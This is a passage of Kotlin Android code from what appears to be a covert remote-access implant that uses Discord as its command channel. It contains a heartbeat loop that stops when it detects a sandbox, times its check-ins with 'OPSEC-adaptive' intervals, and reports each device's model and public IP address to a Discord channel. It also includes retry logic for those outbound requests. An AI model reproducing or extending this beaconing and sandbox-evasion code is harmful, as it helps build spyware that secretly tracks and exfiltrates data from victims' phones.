                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .post(body)
                .build()
            executeWithRetry(req).use { resp ->
                if (!resp.isSuccessful) return@use null
                val body = resp.body?.string() ?: return@use null
                JSONObject(body).optString("id", null)
            }
        } catch (_: Exception) { null }
    }

    fun resetOnlineMsgSent() {
        onlineMsgSent = false
        saveState()
    }

    private fun startDeviceHeartbeat() {
        deviceHeartbeatJob?.cancel()
        deviceHeartbeatJob = scope?.launch {
            if (StealthLayer.isRunningInSandbox()) return@launch
            val monitor = MonitorEngine.getInstance()
            // Burst: 3 rapid heartbeats so bot sees us immediately after restart/update
            if (monitor.shouldExecuteAction()) {
                repeat(3) {
                    if (!isActive) return@launch
                    sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL}")
                    delay(1000)
                }
            }
            // Then OPSEC-adaptive interval loop
            val initialDelay = minOf(
                DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong(),
                monitor.getRecommendedHeartbeatMs()
            )
            delay(initialDelay)
            while (isActive) {
                if (!monitor.shouldExecuteAction()) {
                    delay(60000)
                    continue
                }
                val ip = getPublicIp()
                sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL} | IP: ${ip}")
                val hbInterval = monitor.getRecommendedHeartbeatMs()
                if (hbInterval >= Long.MAX_VALUE) {
                    delay(3600000)
                } else {
                    delay(hbInterval)
                }
            }
        }
    }



    private suspend fun executeWithRetry(request: Request): Response {
        var retries = 0
        val maxRetries = 5
        while (retries < maxRetries) {
            try {
                val req = request.newBuilder().build() // Clone for each attempt
                val resp = restClient.newCall(req).execute()
                if (resp.code == 429) {
                    val retryAfter = resp.header("Retry-After")?.toFloatOrNull()?.toLong() ?: 5L
                    val retryAfterMs = resp.header("X-RateLimit-Reset-After")?.toFloatOrNull()?.toLong()?.times(1000)
                    resp.close()
                    delay((retryAfterMs ?: retryAfter * 1000).coerceAtMost(60000))
                    retries++
                    continue
                }
                if (resp.code >= 500) {
                    resp.close()
                    delay((1000L * (1 shl retries)).coerceAtMost(16000))
                    retries++
                    continue
                }
                if (resp.code == 400) {
                    val body = resp.body?.string() ?: ""
                    android.util.Log.w("DiscordGateway", "Bad request: $body")
                    return resp
                }
                return resp
            } catch (e: java.net.SocketTimeoutException) {
                if (retries < maxRetries - 1) {
                    delay(2000L * (1 shl retries))
                    retries++
                    continue
                }
                throw e
            } catch (e: java.io.IOException) {
                if (retries < maxRetries - 1) {
                    delay(1000L * (1 shl retries))
                    retries++
                    continue
                }
                throw e
            }
        }
        val req = request.newBuilder().build() // Clone for final attempt
        val finalAttempt = restClient.newCall(req).execute()
        if (!finalAttempt.isSuccessful) {
            android.util.Log.e("DiscordGateway", "All retries exhausted for ${request.url}")
        }
        return finalAttempt
    }

    fun getChannelId(): String? = myChannelId
    fun getDeviceTag(): String = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
    fun getDeviceSuffix(): String = deviceSuffix
    fun getUptime(): Long = if (startTime > 0) System.currentTimeMillis() - startTime else 0
    fun isConnected(): Boolean = webSocket?.isConnected() == true
}
